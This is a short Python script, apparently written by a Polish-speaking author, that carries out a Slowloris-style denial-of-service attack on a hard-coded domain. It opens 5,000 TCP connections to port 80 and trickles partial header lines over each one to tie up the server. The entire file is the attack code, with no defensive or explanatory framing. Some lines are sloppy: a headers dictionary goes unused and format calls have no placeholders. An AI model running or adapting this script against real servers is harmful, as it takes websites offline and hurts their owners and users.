# -*- coding: utf-8 -*-
"""
Created on Sun Aug 29 20:29:30 2021

@author: Modecom
"""

import socket
import random
import sys
import time

url_atak = "mattkozlowski.pl"
port = 80

x = 0

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64 rv:91.0.2) Gecko/20100101 Firefox/91.0.2',
    "Accept-language": "pl,en-US;q=0.7,en;q=0.3",
    "Connection": "keep-alive"
}

global lista_gniazd
lista_gniazd = []

#budowanie gniazd TCP
while x < 5000:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((url_atak, port))
    s.send('X-a: b \r\n'.format(random.randint(0,5000)).encode("utf-8"))
    lista_gniazd.append(s)
    x += 1
    
    
for xyz in lista_gniazd:
    xyz.send("X-a: b \r\n".format(random.randint(0,5000)).encode("utf-8"))
    time.sleep(4)
    
